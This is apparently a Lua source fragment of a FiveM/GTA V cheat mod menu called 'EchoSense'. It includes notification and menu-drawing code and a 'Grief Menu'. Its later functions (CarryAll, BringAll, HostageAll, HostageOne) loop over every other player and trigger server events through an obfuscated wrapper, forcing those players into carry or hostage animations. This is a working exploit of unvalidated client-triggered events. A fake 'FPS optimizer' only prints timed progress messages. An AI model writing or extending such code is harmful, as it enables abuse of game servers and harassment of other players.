local function NotifyPrioritize(v, id, duration)
	for i, _ in pairs(v) do
		if i ~= id then
			if v[i].draw then
				NotifyMakeRoom(v[i], v[i].y, v[i].y + ((notifyBody.height + ((v[id].lines - 1) * notifyBody.height)) + notifyBody.gap), duration)
			end
		end
	end
end

local fontHeight = GetTextScaleHeight(notifyBody.scale, notifyBody.font)

local properties = { -- 0.72
	x = 0.67 + menuWidth, 
	y = 1.0, 
	notif = {}, 
	offset = NotifyPrioritize,
}

local sound_type = {
	['success'] = { name = "Hack_Success", set = "DLC_HEIST_BIOLAB_PREP_HACKING_SOUNDS"},
	['info'] = { name = "Faster_Bar_Full", set = "RESPAWN_ONLINE_SOUNDSET" },
	['error'] = { name = "Hack_Failed", set = "DLC_HEIST_BIOLAB_PREP_HACKING_SOUNDS"},
	['menuclosing'] = { name = "FIRST_PLACE", set = "HUD_MINI_GAME_SOUNDSET"},
}

local draw_type = {
	['success'] = { color = themeColors.green, dict = "commonmenu", sprite = "shop_tick_icon", size = 0.016},
	['info'] = { color = themeColors.blue, dict = "shared", sprite = "info_icon_32", size = 0.012},
	['error'] = { color = themeColors.red, dict = "commonmenu", sprite = "mp_alerttriangle", size = 0.016},
	['menuclosing'] = { color = themeColors.red, dict = "mplobby", sprite = "mp_charcard_stats_icons7", size = 0.015},
}

-- Text render wrapper for dynamic animation
local function NotifyDrawText(v, text)
	SetTextFont(notifyBody.font)
	SetTextScale(notifyBody.scale, notifyBody.scale)
	SetTextWrap(v.x, v.x + (menuWidth / 2))
	SetTextColour(255, 255, 255, v.opacity)

	BeginTextCommandDisplayText("notification_buffer")
	AddTextComponentSubstringPlayerName("    " .. text)
	EndTextCommandDisplayText(v.x - notifyBody.width / 2 + frameWidth / 2 + buttonTextXOffset, v.y - notifyBody.gap) -- (notifyBody.height / 2 - fontHeight / 2)
end

-- DrawSpriteScaled and DrawRect wrapper for dynamic animation
local function NotifyDrawBackground(v)
	-- Background
	DrawRect(v.x, v.y + ((v.lines - 1) * (notifyBody.height / 2)) + notifyBody.gap, notifyBody.width, notifyBody.height + ((v.lines - 1) * notifyBody.height), draw_type[v.type].color.r, draw_type[v.type].color.g, draw_type[v.type].color.b, v.opacity - 100) --57,55,91
	DrawSpriteScaled(draw_type[v.type].dict, draw_type[v.type].sprite, v.x - notifyBody.width / 2 + 0.008, v.y + notifyBody.gap, draw_type[v.type].size, nil, 0.0, 255, 255, 255, v.opacity)
	-- Highlight
	-- DrawRect(v.x - 0.0025 - (notifyBody.width / 2), v.y + (((v.lines - 1) * notifyBody.offsetLine) + notifyBody.finalPadding) / 2, 0.005, notifyBody.height + (((v.lines - 1) * notifyBody.offsetLine) + notifyBody.finalPadding), draw_type[v.type].r, draw_type[v.type].g, draw_type[v.type].b, v.opacity) -- 116, 92, 151
	
	
	--DrawRect(minimap.x, minimap.y, 0.01, 0.015, 255, 255, 255, v.opacity)
	--DrawSpriteScaled(body.dict, body.sprite, v.x - 0.045, v.y, 0.010, 0.04, 0, 255, 255, 255, v.opacity - 50)
end

local function NotifyFormat(inputString, ...)
	local format = string.format
	text = format(inputString, ...)
	return text
end

local notifyPreviousText = nil

local notifyQueue = 0

-- Free up the 'p.notif' table if notification is no longer being drawn on screen
local function NotifyRecycle()
	--local disposeList = {}
	local notif = properties.notif

	-- debugprint("^3NotifyRecycle: ^0Old table size: ^3" .. #p.notif)

	local drawnTable = {}

	-- allocate notifications currently on screen to drawnTable
	for i, _ in pairs(notif) do
		if notif[i].draw then
			drawnTable[i] = notif[i]
		end
	end

	-- remove notifications if they aren't drawing; shrinks size of table
	notif = drawnTable


	-- debugprint("^3NotifyRecycle: ^0New table size: ^3" .. #p.notif)
	-- debugprint("^3NotifyRecycle: ^4Returning: ^3" .. #p.notif + 1)
	return #notif + 1
end

-- Responsible for making sure the notification 'stick' to the menu footer
local function NotifyRecalibrate()
	local p = properties
	local stackIndex = 0

	for id, _ in pairs(p.notif) do
		if p.notif[id].draw then
			stackIndex = stackIndex + 1
		end
	end

	-- debugprint("^5Recalibrate:^0 table size is " .. stackIndex)

	for id, _ in pairs(p.notif) do
		if p.notif[id].draw then
			if p.notif[id].tin then p.notif[id].tin = false end
			-- if p.notif[id].makeRoom then p.notif[id].makeRoom = false end

			-- debugprint("^5Recalibrate ID: ^0" .. id)
			p.notif[id].y = (p.y - notifyBody.footerYOffset) + ((notifyBody.height + ((p.notif[id].lines - 1) * notifyBody.height) + notifyBody.gap) * (stackIndex - 1))
		
			stackIndex = stackIndex - 1
		end
	end
end

-- Define thread function
local function NotifyNewThread(options)
	local text = options.text or notifyDefault.text
	local transition = options.transition or notifyDefault.transition
	local timeout = options.timeout or notifyDefault.timeout
	local type = options.type or notifyDefault.type
	local sound = sound_type[type]
	
	local p = properties

	local nbrLines = NotifyCountLines(p, text)

	local beginY = 0.0
	local beginAlpha = 0
	
	-- garbage queueing system :)
	notifyQueue = notifyQueue + transition
	Wait(notifyQueue - transition)
	
	local id = NotifyRecycle()

	--debugprint("^3-------- Notification " .. id .. " " .. type .. "--------")
	p.notif[id] = {
		x = p.x,
		y = 0,
		type = type,
		opacity = 0,
		lines = nbrLines,
		tin = true,
		draw = true,
		tout = false,
	}

	p.offset(p.notif, id, transition) --(0.05 * (id - 1))
	
	-- Drawing
	local function NotifyDraw()
		SetScriptGfxDrawOrder(5)
		while p.notif[id].draw do
			if takytemamrad.IsAnyMenuOpened() then
				NotifyDrawBackground(p.notif[id])
				NotifyDrawText(p.notif[id], text)
			end
			Wait(0)
		end
	
		-- Schedule notification for garbage collection
		p.notif[id].dispose = true
	end
	CreateThread(NotifyDraw)

	-- Transition In
	local function NotifyFadeIn()
		local change = p.y - notifyBody.footerYOffset

		local timer = 0
	
		local function SetTimerIn() -- set the timer to 0
			timer = GetGameTimer()
		end
	
		local function GetTimerIn() -- gets the timer (counts up)
			return GetGameTimer() - timer
		end
		
		PlaySoundFrontend(-1, sound.name, sound.set, true)
	
		SetTimerIn() -- reset current timer to 0
		while p.notif[id].tin do
			local tinY = outCubic(GetTimerIn(), beginY, change, transition)
			local tinAlpha = inOutCubic(GetTimerIn(), beginAlpha, 255, transition)
	
			if p.notif[id].y >= change then
				p.notif[id].y = change
				p.notif[id].tin = false
				break
			else
				p.notif[id].y = tinY
				p.notif[id].opacity = floor(tinAlpha + 0.5)
			end
			Wait(5)
		end
		notifyQueue = notifyQueue - transition
		p.notif[id].opacity = 255
	end
	CreateThread(NotifyFadeIn)

	-- Fade out wait timeout
	Wait(timeout + transition)
	p.notif[id].beginOut = true
	p.notif[id].tout = true
	
	-- Fade out
	local function NotifyFadeOut()
		local timer = 0
	
		local function SetTimerOut(ms)
			timer = GetGameTimer() - ms
		end
	
		local function GetTimerOut()
			return GetGameTimer() - timer
		end
	
		while p.notif[id].draw do
			while p.notif[id].tout do
				
				if p.notif[id].beginOut then 
					SetTimerOut(0)
					p.notif[id].beginOut = false 
				end
	
				local opa = inOutCubic(GetTimerOut(), 255, -510, transition)
				if opa <= 0 then
	
					p.notif[id].tout = false
					p.notif[id].draw = false
	
					break
				else
					p.notif[id].opacity = floor(opa + 0.5)
				end
				Wait(5)
			end
			
			Wait(5)
		end
	end
	CreateThread(NotifyFadeOut)
end


local function debugdebugprint(text)
	if takytemamrad.debug then
		Citizen.Trace("[takytemamrad] " .. text)
	end
end

local function setMenuProperty(id, property, value)
	if id and menus[id] then
		menus[id][property] = value
	end
end

local function isMenuVisible(id)
	if id and menus[id] then
		return menus[id].visible
	else
		return false
	end
end

local function setMenuVisible(id, visible, restoreIndex)
	if id and menus[id] then
		setMenuProperty(id, "visible", visible)
		setMenuProperty(id, "currentOption", 1)

		if restoreIndex then
			setMenuProperty(id, "currentOption", menus[id].storedOption)
		end

		if visible then
			if id ~= currentMenu and isMenuVisible(currentMenu) then
				setMenuProperty(currentMenu, "storedOption", menus[currentMenu].currentOption)
				setMenuVisible(currentMenu, false)
			end

			currentMenu = id
		end
	end
end

local function drawText(text, x, y, font, color, scale, center, shadow, alignRight)
	SetTextColour(color.r, color.g, color.b, color.a)
	SetTextFont(font)
	SetTextScale(scale / aspectRatio, scale)

	if shadow then
		SetTextDropShadow(2, 2, 0, 0, 0)
	end

	if menus[currentMenu] then
		if center then
			SetTextCentre(center)
		elseif alignRight then
			SetTextWrap(menus[currentMenu].x, menus[currentMenu].x + menuWidth - buttonTextXOffset)
			SetTextRightJustify(true)
		end
	end
	BeginTextCommandDisplayText("text_buffer")
	AddTextComponentString(text)
	EndTextCommandDisplayText(x, y)
end

local function drawPreviewText(text, x, y, font, color, scale, center, shadow, alignRight)
	SetTextColour(color.r, color.g, color.b, color.a)
	SetTextFont(font)
	SetTextScale(scale / aspectRatio, scale)

	if shadow then
		SetTextDropShadow(2, 2, 0, 0, 0)
	end

	if menus[currentMenu] then
		if center then
			SetTextCentre(center)
		elseif alignRight then
			local rX = menus[currentMenu].x - frameWidth / 2 - frameWidth - previewWidth / 2
			SetTextWrap(rX, rX + previewWidth / 2 - buttonTextXOffset / 2)
			SetTextRightJustify(true)
		end
	end
	BeginTextCommandDisplayText("preview_text_buffer")
	AddTextComponentString(text)
	EndTextCommandDisplayText(x, y)
end

local function drawRect(x, y, width, height, color)
	DrawRect(x, y, width, height, color.r, color.g, color.b, color.a)
end

-- [NOTE] MenuDrawTitle
local function drawTitle()
	if menus[currentMenu] then
		local x = menus[currentMenu].x + menuWidth / 2
		local y = menus[currentMenu].y + titleHeight / 2
        if menus[currentMenu].background == "default" then
			if _menuColor.base == themeColors.purple then
				drawRect(x, y, menuWidth, titleHeight, menus[currentMenu].titleBackgroundColor)
			else
				DrawSpriteScaled("commonmenu", "interaction_bgd", x, y + 0.025, menuWidth, (titleHeight * -1) - 0.025, 0.0, 255, 76, 60, 255) -- 255, 76, 60,
				DrawSpriteScaled("commonmenu", "interaction_bgd", x, y + 0.025, menuWidth, (titleHeight * -1) - 0.025, 0.0, _menuColor.base.r, _menuColor.base.g, _menuColor.base.b, 255)
			end
		elseif menus[currentMenu].background == "weaponlist" then
			if _menuColor.base == themeColors.purple then
				DrawSpriteScaled("heisthud", "main_gradient", x, y + 0.025, menuWidth, (titleHeight * -1) - 0.025, 0.0, 255, 255, 255, 140) -- 255, 76, 60,
			else
				DrawSpriteScaled("heisthud", "main_gradient", x, y + 0.025, menuWidth, (titleHeight * -1) - 0.025, 0.0, _menuColor.base.r, _menuColor.base.g, _menuColor.base.b, 255)
			end
			 -- rgb(155, 89, 182)
		else
            drawRect(x, y, menuWidth, titleHeight, menus[currentMenu].titleBackgroundColor)
		end

		drawText(
			menus[currentMenu].title,
			x,
			y - titleHeight / 2 + titleYOffset,
			menus[currentMenu].titleFont,
			menus[currentMenu].titleColor,
			titleScale,
			true
		)
	end
end

local function drawSubTitle()
	local sepcolor = { r = barva.r, g = barva.g, b = barva.b, a = 255 }
	if menus[currentMenu] then
		local x = menus[currentMenu].x + menuWidth / 2
		local y = menus[currentMenu].y + titleHeight + buttonHeight / 2

		--local txn = CreateRuntimeTextureFromImage('meows', "woof", "https://imgur.com/8giJMPr.png") -- https://imgur.com/8giJMPr

		AddReplaceTexture("shopui_title_graphics_franklin", "shopui_title_graphics_franklin", "meows", "woof")


        -- Header
		--DrawSpriteScaled("commonmenu", "shop_franklin_icon_a", x, y -0.022, menuWidth, buttonHeight, 0, 255, 255, 255, 255) -- local function DrawSpriteScaled(textureDict, textureName, screenX, screenY, width, height, heading, red, green, blue, alpha)
			if Rage == false then
				DrawSprite("meows", "woof", x, y -0.025, menuWidth, buttonHeight +0.05, 0, 255, 255, 255, 255)
			elseif Rage == true then
				DrawSprite("meows", "woof2", x, y -0.025, menuWidth, buttonHeight +0.05, 0, 255, 255, 255, 255)
			end
			if Klidny == false then
				DrawSprite("meows", "woof", x, y -0.025, menuWidth, buttonHeight +0.05, 0, 255, 255, 255, 255)
			end
			
		--drawRect(x, y, menuWidth, buttonHeight, menus[currentMenu].menuFrameColor)
		-- Separator
		drawRect(x, y + (buttonHeight / 2) + (separatorHeight / 2), menuWidth, separatorHeight, sepcolor)

		--[[
		drawText(
			menus[currentMenu].subTitle,
			menus[currentMenu].x + buttonTextXOffset,
			y - buttonHeight / 2 + buttonTextYOffset,
			buttonFont,
			_menuColor.base,
			buttonScale,
			false
		)
		--]]
		if optionCount > menus[currentMenu].maxOptionCount then
			drawText(
				tostring(menus[currentMenu].currentOption) .. " / " .. tostring(optionCount),
				menus[currentMenu].x + menuWidth,
				y - buttonHeight / 2 + buttonTextYOffset,
				buttonFont,
				_menuColor.base,
				buttonScale,
				false,
				false,
				true
			)
		end
	end
end


local welcomeMsg = true

local function drawFooter()
    local sepcolor = { r = barva.r, g = barva.g, b = barva.b, a = 255 }
	if menus[currentMenu] then
		local multiplier = nil
		local x = menus[currentMenu].x + menuWidth / 2
		 --local y = menus[currentMenu].y + titleHeight - 0.015 + buttonHeight + menus[currentMenu].maxOptionCount * buttonHeight
		 --DrawSpriteScaled("commonmenu", "interaction_bgd", x, y + 0.025, menuWidth, (titleHeight * -1) - 0.025, 0.0, 255, 76, 60, 255) -- r = 231, g = 76, b = 60
		local footerColor = menus[currentMenu].menuFrameColor

		if menus[currentMenu].currentOption <= menus[currentMenu].maxOptionCount and optionCount <= menus[currentMenu].maxOptionCount then
			multiplier = optionCount
		elseif optionCount >= menus[currentMenu].currentOption then
			multiplier = 10
		end

		if multiplier then
			local y = menus[currentMenu].y + titleHeight + buttonHeight + separatorHeight + (buttonHeight * multiplier) --0.015

            -- Footer
            drawRect(x, y + (buttonHeight / 4) + (footerHeight / 8), menuWidth, footerHeight, sepcolor)
			drawRect(x, y + (footerHeight / 2), menuWidth, footerHeight, footerColor)

			local yFrame = menus[currentMenu].y + titleHeight + ((buttonHeight + separatorHeight + (buttonHeight * multiplier) + footerHeight) / 2)
			local frameHeight = buttonHeight + separatorHeight + footerHeight + (buttonHeight * multiplier)
			-- Frame Left
			--drawRect(x - menuWidth / 2, yFrame, frameWidth, frameHeight, footerColor)
			-- Frame Right
			--drawRect(x + menuWidth / 2, yFrame, frameWidth, frameHeight, footerColor)

			drawText(menus[currentMenu].version, menus[currentMenu].x + buttonTextXOffset, y - separatorHeight + (footerHeight / 2 - fontHeight / 2), menus[currentMenu].titleFont, {r = 62, g = 62, b = 92, a = 128}, buttonScale, false) --62, 62, 92
			drawText(menus[currentMenu].branding, x, y - separatorHeight + (footerHeight / 2 - fontHeight / 2), menus[currentMenu].titleFont, sepcolor, buttonScale, false, false, true)
			
			local offset = 1.0 - (y + footerHeight / 2 + notifyBody.height)

			if notifyBody.footerYOffset ~= offset then
				notifyBody.footerYOffset = offset
				NotifyRecalibrate()
			end
		end

		if welcomeMsg then
			welcomeMsg = false
			takytemamrad.SendNotification({text = "Welcome to EchoSense by CK Gang", type = "info"})
		end
	end
end

local function drawButton(text, subText, color, subcolor)
	local x = menus[currentMenu].x + menuWidth / 2
	local multiplier = nil
	local pointer = true

	if menus[currentMenu].currentOption <= menus[currentMenu].maxOptionCount and optionCount <= menus[currentMenu].maxOptionCount then
		multiplier = optionCount
	elseif
		optionCount > menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount and
			optionCount <= menus[currentMenu].currentOption
	 then
		multiplier = optionCount - (menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount)
	end

	if multiplier then
		local y = menus[currentMenu].y + titleHeight + buttonHeight + 0.0025 + (buttonHeight * multiplier) - buttonHeight / 2 -- 0.0025 is the offset for the line under subTitle
		local backgroundColor = nil
		local textColor = nil
		local subTextColor = nil
		local shadow = false

		if menus[currentMenu].currentOption == optionCount then
			backgroundColor = menus[currentMenu].menuFocusBackgroundColor
			textColor = color or menus[currentMenu].menuFocusTextColor
			pointColor = menus[currentMenu].menuFocusPointerColor
			subTextColor = subcolor or menus[currentMenu].menuSubTextColor
			selectionColor = { r = 255, g = 255, b = 255, a = 255 }
			shadow = true
		else
			backgroundColor = menus[currentMenu].menuBackgroundColor
			textColor = color or menus[currentMenu].menuTextColor
			pointColor = menus[currentMenu].menuInvisibleColor
			subTextColor = subcolor or menus[currentMenu].menuSubTextColor
			selectionColor = menus[currentMenu].menuInvisibleColor
			shadow = true
		end

		drawRect(x, y, menuWidth, buttonHeight, backgroundColor)

		if menus[currentMenu].subTitle == "ECHO MENU" then -- and subText == "isMenu"
			drawText(
			text,
			menus[currentMenu].x + 0.020,
			y - (buttonHeight / 2) + buttonTextYOffset,
			buttonFont,
			textColor,
			buttonScale,
			false,
			shadow
			)

			if text == '<font color="#66666A">Self Options' then
				-- w/h = 0.02
				DrawSpriteScaled("commonmenutu", "last_team_standing", menus[currentMenu].x + buttonSpriteXOffset, y, buttonSpriteScale.x, buttonSpriteScale.y, 0.0, 52, 52, 69, 255) -- rgb(26, 188, 156)
			elseif text == '<font color="#66666A">Online Options' then
				DrawSpriteScaled("mpleaderboard", "leaderboard_friends_icon", menus[currentMenu].x + buttonSpriteXOffset, y, buttonSpriteScale.x, buttonSpriteScale.y, 0.0, 52, 52, 69, 255) -- rgb(52, 152, 219)
			elseif text == '<font color="#66666A">Visual Options' then
				DrawSpriteScaled("mphud", "spectating", menus[currentMenu].x + buttonSpriteXOffset, y, buttonSpriteScale.x, buttonSpriteScale.y, 0.0, 52, 52, 69, 255) -- rgb(236, 240, 241)
			elseif text == '<font color="#66666A">Teleport Options' then
				DrawSpriteScaled("commonmenutu", "base_jumping", menus[currentMenu].x + buttonSpriteXOffset, y, buttonSpriteScale.x, buttonSpriteScale.y, 0.0, 52, 52, 69, 255) -- rgb(241, 196, 15)
			elseif text == '<font color="#66666A">Vehicle Options' then
				DrawSpriteScaled("mpleaderboard", "leaderboard_transport_car_icon", menus[currentMenu].x + buttonSpriteXOffset, y, buttonSpriteScale.x, buttonSpriteScale.y, 0.0, 52, 52, 69, 255) -- rgb(230, 126, 34)
			elseif text == '<font color="#66666A">Weapon Options'then
				DrawSpriteScaled("mpweaponsgang0", "w_pi_stungun_silhouette", menus[currentMenu].x + buttonSpriteXOffset, y, buttonSpriteScale.x, buttonSpriteScale.y, 0.0, 52, 52, 69, 255) -- rgb(231, 76, 60)
			elseif text == '<font color="#66666A">Server Options' then
				DrawSpriteScaled("mpleaderboard", "leaderboard_globe_icon", menus[currentMenu].x + buttonSpriteXOffset, y, buttonSpriteScale.x, buttonSpriteScale.y, 0.0, 52, 52, 69, 255) -- rgb(155, 89, 182)
			elseif text == '<font color="#66666A">Grief Menu' then
				DrawSpriteScaled("commonmenutu", "team_deathmatch", menus[currentMenu].x + buttonSpriteXOffset, y, buttonSpriteScale.x, buttonSpriteScale.y, 0.0, 52, 52, 69, 255) -- rgb(155, 89, 182)
			elseif text == '<font color="#66666A">Menu Settings' then
				DrawSpriteScaled("mpleaderboard", "leaderboard_position_icon", menus[currentMenu].x + buttonSpriteXOffset, y, buttonSpriteScale.x, buttonSpriteScale.y, 0.0, 52, 52, 69, 255) -- rgb(241, 196, 15)
			end
		else
			drawText(
			text,
			menus[currentMenu].x + buttonTextXOffset,
			y - (buttonHeight / 2) + buttonTextYOffset,
			buttonFont,
			textColor,
			buttonScale,
			false,
			shadow
			)
		end

		if subText == "isMenu" then
            DrawSpriteScaled("commonmenu", "arrowright", x + menuWidth / 2.25, y, 0.008, nil, 0.0, pointColor.r, pointColor.g, pointColor.b, pointColor.a)
            DrawSpriteScaled("commonmenu", "arrowright", x + menuWidth / 2.35, y, 0.008, nil, 0.0, pointColor.r, pointColor.g, pointColor.b, pointColor.a)
			-- menus[currentMenu].title = ""
		elseif subText == "toggleOff" then
			x = x + menuWidth / 2 - frameWidth / 2 - toggleOuterWidth / 2 - buttonTextXOffset
			drawRect(x, y, toggleOuterWidth, toggleOuterHeight, menus[currentMenu].buttonSubBackgroundColor)
			-- drawRect(x, y, toggleInnerWidth, toggleInnerHeight, {r = 90, g = 90, b = 90, a = 230})
		elseif subText == "toggleOn" then
			x = x + menuWidth / 2 - frameWidth / 2 - toggleOuterWidth / 2 - buttonTextXOffset
			drawRect(x, y, toggleOuterWidth, toggleOuterHeight, menus[currentMenu].buttonSubBackgroundColor)
			DrawSpriteScaled("commonmenu", "shop_tick_icon", x, y, 0.020, nil, 0.0, _menuColor.base.r, _menuColor.base.g, _menuColor.base.b, 255)
			--drawRect(x, y, toggleInnerWidth, toggleInnerHeight, _menuColor.base) -- 26, 188, 156, 255
		elseif subText == "danger" then
			DrawSpriteScaled("commonmenu", "mp_alerttriangle", x + menuWidth / 2.35, y, 0.021, nil, 0.0, 255, 255, 255, 255)
		elseif subText then			
			drawText(
				subText,
				menus[currentMenu].x + 0.005,
				y - buttonHeight / 2 + buttonTextYOffset,
				buttonFont,
				subTextColor,
				buttonScale,
				false,
				shadow,
				true
			)

		end
	end
end


-- Funkce

takytemamrad.MoreFPS = function()
	-- Enviroment Clear
	LeaderboardsClearCacheData()
	LeaderboardsReadClearAll()
	ClearAllBrokenGlass()
	ClearAllHelpMessages()
	ClearBrief()
	ClearGpsFlags()
	ClearPrints()
	ClearSmallPrints()
	ClearReplayStats()
	ClearFocus()
	ClearHdArea()
	ClearRelationshipBetweenGroups()
	ClearRagdollBlockingFlags()
	ClearFacialClipsetOverride()
	ClearFacialIdleAnimOverride()
	-- Ped Clear (PlayerPedId())
	ResetPedVisibleDamage(PlayerPedId())
	ClearPedBloodDamage(PlayerPedId())
	ClearPedWetness(PlayerPedId())
	ClearPedEnvDirt(PlayerPedId())
	ClearAllPedVehicleForcedSeatUsage(PlayerPedId())
	ClearPedDriveByClipsetOverride(PlayerPedId())
	--ClearPedLastDamageBone(PlayerPedId())
	ClearAllPedProps(PlayerPedId())
	ClearPedAlternateWalkAnim(PlayerPedId())
	--ClearPedDamageDecalByZone(PlayerPedId())
	ClearPedDecorations(PlayerPedId())
	--ClearPedScubaGearVariation(PlayerPedId())
	--ClearPedNonCreationArea(PlayerPedId())
end

-- Optimizer FPS --
takytemamrad.OptimizerPrint = function()
	debugprint("FPS Optimizer for Client")
	debugprint("This process will take about 15 sec")
	Wait(1500)
	debugprint("Starting Optimizer...")
	Wait(2000) 
	debugprint("Optimizing FPS...")
	Wait(2000)
	debugprint("Cleaning Peds...")
	Wait(2000)
	debugprint("Cleaning Props...")
	Wait(2000)
	debugprint("Cleaning NPC cars...")
	Wait(2000)
	debugprint("Cleaning Environment...")
	Wait(2000)
	debugprint("Cleaning Particles...")
	Wait(2000)
	debugprint("DONE!")
	Wait(200)
	debugprint("Relaunching Menu...")
end

takytemamrad.FullPerfo = function()
	SetVehicleModKit(FullPerfo, 0.0)
	SetVehicleMod(FullPerfo, 11, GetNumVehicleMods(FullPerfo, 11) - 1, false)
	SetVehicleMod(FullPerfo, 12, GetNumVehicleMods(FullPerfo, 12) - 1, false)
	SetVehicleMod(FullPerfo, 13, GetNumVehicleMods(FullPerfo, 13) - 1, false)
	SetVehicleMod(FullPerfo, 15, GetNumVehicleMods(FullPerfo, 15) - 2, false)
	SetVehicleMod(FullPerfo, 16, GetNumVehicleMods(FullPerfo, 16) - 1, false)
	ToggleVehicleMod(FullPerfo, 17, true)
	ToggleVehicleMod(FullPerfo, 18, true)
	ToggleVehicleMod(FullPerfo, 19, true)
	ToggleVehicleMod(FullPerfo, 21, true)
end

takytemamrad.FullTune = function()
	SetVehicleModKit(FullTune, 0.0)
	SetVehicleCustomPrimaryColour(GetVehiclePedIsIn(PlayerPedId(), 0.0), 0.0, 0.0, 0.0)
	SetVehicleCustomSecondaryColour(GetVehiclePedIsIn(PlayerPedId(), 0.0), 0.0, 0.0, 0.0)
	SetVehicleColours(FullTune, 12, 12)
	SetVehicleModColor_1(FullTune, 3, 0.0)
	SetVehicleExtraColours(FullTune, 3, 0.0)
	ToggleVehicleMod(FullTune, 18, 1)
	ToggleVehicleMod(FullTune, 22, 1)
	SetVehicleMod(FullTune, 16, 5, 0.0)
	SetVehicleMod(FullTune, 12, 2, 0.0)
	SetVehicleMod(FullTune, 11, 3, 0.0)
	SetVehicleMod(FullTune, 14, 14, 0.0)
	SetVehicleMod(FullTune, 15, 3, 0.0)
	SetVehicleMod(FullTune, 13, 2, 0.0)
	SetVehicleWindowTint(FullTune, 5)
	SetVehicleWheelType(FullTune, 0.0)
	SetVehicleMod(FullTune, 23, 21, 1)
	SetVehicleMod(FullTune, 0.0, 1, 0.0)
	SetVehicleMod(FullTune, 1, 1, 0.0)
	SetVehicleMod(FullTune, 2, 1, 0.0)
	SetVehicleMod(FullTune, 3, 1, 0.0)
	SetVehicleMod(FullTune, 4, 1, 0.0)
	SetVehicleMod(FullTune, 5, 1, 0.0)
	SetVehicleMod(FullTune, 6, 1, 0.0)
	SetVehicleMod(FullTune, 7, 1, 0.0)
	SetVehicleMod(FullTune, 8, 1, 0.0)
	SetVehicleMod(FullTune, 9, 1, 0.0)
	SetVehicleMod(FullTune, 10, 1, 0.0)
	IsVehicleNeonLightEnabled(FullTune, 1)
	SetVehicleNeonLightEnabled(FullTune, 0.0, 1)
	SetVehicleNeonLightEnabled(FullTune, 1, 1)
	SetVehicleNeonLightEnabled(FullTune, 2, 1)
	SetVehicleNeonLightEnabled(FullTune, 3, 1)
	SetVehicleNeonLightEnabled(FullTune, 4, 1)
	SetVehicleNeonLightEnabled(FullTune, 5, 1)
	SetVehicleNeonLightEnabled(FullTune, 6, 1)
	SetVehicleNeonLightEnabled(FullTune, 7, 1)
	SetVehicleNeonLightsColour(FullTune, 255, 128, 0.0)
	SetVehicleModKit(FullTune, 0.0)
	ToggleVehicleMod(FullTune, 20, 1)
	SetVehicleModKit(FullTune, 0.0)
	SetVehicleTyreSmokeColor(FullTune, 255, 128, 0.0)
end

-- Carry All --
takytemamrad.CarryAll = function()
		local lib = 'anim@arena@celeb@flat@paired@no_props@'
		local lib2 = 'missfinale_c2mcs_1'
		local lib3 = 'nm'
		local anim1 = 'piggyback_c_player_a'
		local anim2 = 'piggyback_c_player_b'
		local distans = -0.0
		local distans2 = 0.0
		local height = 0.45
		local spin = 0.0
		local length = 100000
		local controlFlagMe = 49
		local controlFlagTarget = 33
		local animFlagTarget = 1
		for _, i in ipairs(GetActivePlayers()) do
			if i ~= PlayerId() then
				BLOWMYDICK('cmg2_animations:sync', i, lib, anim1, anim2, distans, distans2, height, GetPlayerServerId(i), length, spin, controlFlagMe, controlFlagTarget, animFlagTarget)
				BLOWMYDICK('cmg2_animations:sync', i, lib2, lib3, anim1, anim2, distans, distans2, height, GetPlayerServerId(i), length, spin, controlFlagMe, controlFlagTarget, animFlagTarget)
				BLOWMYDICK('CarryPeople:sync', i, lib2, lib3, anim1, anim2, distans, distans2, height, GetPlayerServerId(i), length, spin, controlFlagMe, controlFlagTarget, animFlagTarget)
				BLOWMYDICK('CarryPeople:sync', i, lib, anim1, anim2, distans, distans2, height, GetPlayerServerId(i), length, spin, controlFlagMe, controlFlagTarget, animFlagTarget)
				Wait(10)
			end
		end
	end

-- Bring All --
takytemamrad.BringAll = function()
	local lib = 'anim@arena@celeb@flat@paired@no_props@'
	local lib2 = 'missfinale_c2mcs_1'
	local lib3 = 'nm'
	local anim1 = 'piggyback_c_player_a'
	local anim2 = 'piggyback_c_player_b'
	local distans = -0.0
	local distans2 = 0.0
	local height = 0.45
	local spin = 0.0
	local length = 1
	local controlFlagMe = 49
	local controlFlagTarget = 33
	local animFlagTarget = 1
	for _, i in ipairs(GetActivePlayers()) do
		if i ~= PlayerId() then
			BLOWMYDICK('cmg2_animations:sync', i, lib, anim1, anim2, distans, distans2, height, GetPlayerServerId(i), length, spin, controlFlagMe, controlFlagTarget, animFlagTarget)
			BLOWMYDICK('cmg2_animations:sync', i, lib2, lib3, anim1, anim2, distans, distans2, height, GetPlayerServerId(i), length, spin, controlFlagMe, controlFlagTarget, animFlagTarget)
			BLOWMYDICK('CarryPeople:sync', i, lib2, lib3, anim1, anim2, distans, distans2, height, GetPlayerServerId(i), length, spin, controlFlagMe, controlFlagTarget, animFlagTarget)
			BLOWMYDICK('CarryPeople:sync', i, lib, anim1, anim2, distans, distans2, height, GetPlayerServerId(i), length, spin, controlFlagMe, controlFlagTarget, animFlagTarget)
			BLOWMYDICK("CarryPeople:stop", GetPlayerServerId(i))
			Wait(10)
			BLOWMYDICK("cmg2_animations:stop", GetPlayerServerId(i))
			BLOWMYDICK("cmg2_animations:stop", GetPlayerServerId(i))
			BLOWMYDICK("CarryPeople:stop", GetPlayerServerId(i))
			BLOWMYDICK("CarryPeople:stop", GetPlayerServerId(i))
			Wait(1)
		end
	end
end

-- Hostage All --
takytemamrad.HostageAll = function()
	local lib = 'anim@gangops@hostage@'
	local anim1 = 'perp_idle'
	local lib2 = 'anim@gangops@hostage@'
	local anim2 = 'victim_idle'
	local distans = 0.11 
	local distans2 = -0.24 
	local height = 0.0
	local spin = 0.0		
	local length = 1
	local controlFlagMe = 49
	local controlFlagTarget = 49
	local animFlagTarget = 50
	for _, i in ipairs(GetActivePlayers()) do
		if i ~= PlayerId() then
			BLOWMYDICK('cmg3_animations:sync', i, lib, lib2, anim1, anim2, distans, distans2, height, GetPlayerServerId(i), length, spin, controlFlagMe, controlFlagTarget, animFlagTarget, attachFlag)
			Wait(10)
		end
	end
end

-- Hostage Jeden --
takytemamrad.HostageOne = function(SelectedPlayer)
	local lib = 'anim@gangops@hostage@'
	local anim1 = 'perp_idle'
	local lib2 = 'anim@gangops@hostage@'
	local anim2 = 'victim_idle'
	local distans = 0.11 
	local distans2 = -0.24 
	local height = 0.0
	local spin = 0.0		
	local length = 1
	local controlFlagMe = 49
	local controlFlagTarget = 49
	local animFlagTarget = 50
